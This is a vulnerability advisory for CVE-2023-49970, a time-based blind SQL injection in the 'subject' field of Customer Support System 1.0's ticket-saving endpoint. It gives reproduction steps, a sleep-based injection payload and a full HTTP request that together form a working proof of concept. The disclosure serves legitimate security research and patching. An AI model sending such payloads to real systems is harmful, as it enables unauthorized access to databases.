# CVE-2023-49970
# Customer Support System 1.0 - SQL Injection Vulnerability in the "subject" Parameter During "save_ticket" Operation

**Description**: A SQL Injection vulnerability exists in version 1 of the Customer Support System. A malicious attacker can issue SQL commands to the MySQL database when creating/editing a ticket through the vulnerable parameter 'subject'.  
  
**Vulnerable Product Version**: Customer Support System 1.0  
**CVE Author**: Geraldo Alcântara  
**Date**: 28/11/2023  
**Confirmed on**: 19/12/2023  
**CVE**: CVE-2023-49970     
**Tested on**: Windows  
### Steps to reproduce:  
1- Log in to the application.  
2- Navigate to the page /customer_support/index.php?page=new_ticket to add a new ticket or to /customer_support/index.php?page=ticket_list to edit a ticket.  
3- Create or edit a ticket and insert a malicious payload into "subject" parameter.  
**payload**: Teste2@Teste2.com'+(select*from(select(sleep(2)))a)+'  
### Request:

```
POST /customer_support/ajax.php?action=save_ticket HTTP/1.1
Host: 192.168.68.148
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0
Accept: */*
Accept-Language: pt-BR,pt;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br
X-Requested-With: XMLHttpRequest
Content-Type: multipart/form-data; boundary=---------------------------81419250823331111993422505835
Content-Length: 853
Origin: http://192.168.68.148
Connection: close
Referer: http://192.168.68.148/customer_support/index.php?page=new_ticket
Cookie: csrftoken=1hWW6JE5vLFhJv2y8LwgL3WNPbPJ3J2WAX9F2U0Fd5H5t6DSztkJWD4nWFrbF8ko; sessionid=xrn1sshbol1vipddxsijmgkdp2q4qdgq; PHPSESSID=mfd30tu0h0s43s7kdjb74fcu0l

-----------------------------81419250823331111993422505835
Content-Disposition: form-data; name="id"


-----------------------------81419250823331111993422505835
Content-Disposition: form-data; name="subject"

teste'+(select*from(select(sleep(5)))a)+'
-----------------------------81419250823331111993422505835
Content-Disposition: form-data; name="customer_id"

3
-----------------------------81419250823331111993422505835
Content-Disposition: form-data; name="department_id"

4
-----------------------------81419250823331111993422505835
Content-Disposition: form-data; name="description"

<p>Blahs<br></p>
-----------------------------81419250823331111993422505835
Content-Disposition: form-data; name="files"; filename=""
Content-Type: application/octet-stream


-----------------------------81419250823331111993422505835--

```
Discoverer(s)/Credits:
Geraldo Alcântara
